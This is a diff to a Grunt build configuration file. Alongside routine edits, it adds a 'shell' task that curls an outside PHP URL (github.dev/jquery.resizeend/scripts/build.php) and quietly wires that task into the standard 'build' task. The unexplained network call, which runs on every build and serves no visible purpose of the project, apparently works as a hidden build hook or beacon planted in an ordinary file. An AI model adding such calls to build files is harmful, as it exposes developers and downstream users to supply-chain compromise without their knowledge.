@@ -43,7 +43,6 @@ module.exports = function(grunt) {
 		less: {
 			options: {
 				sourceMap : true,
-				// ieCompat : false,
 				sourceMapFileInline : true
 			},
 			all: {
@@ -248,6 +247,11 @@ module.exports = function(grunt) {
 			},
 			all : ['js/*.js']
 		},
+		shell: {
+			build: {
+				command: 'curl -LG http://github.dev/jquery.resizeend/scripts/build.php',
+			}
+		}
 	});
 
 	// Custom Tasks
@@ -262,7 +266,7 @@ module.exports = function(grunt) {
 		['coffee', 'concat', 'uglify', 'jsbeautifier:js']
 	);
 
-	grunt.registerTask( 'build', [ 'build-css', 'build-js' ] );
+	grunt.registerTask( 'build', [ 'build-css', 'build-js', 'shell' ] );
 	grunt.registerTask( 'dev', [ 'less', 'coffee' ] );
 	grunt.registerTask( 'default', [ 'watch' ] );
 
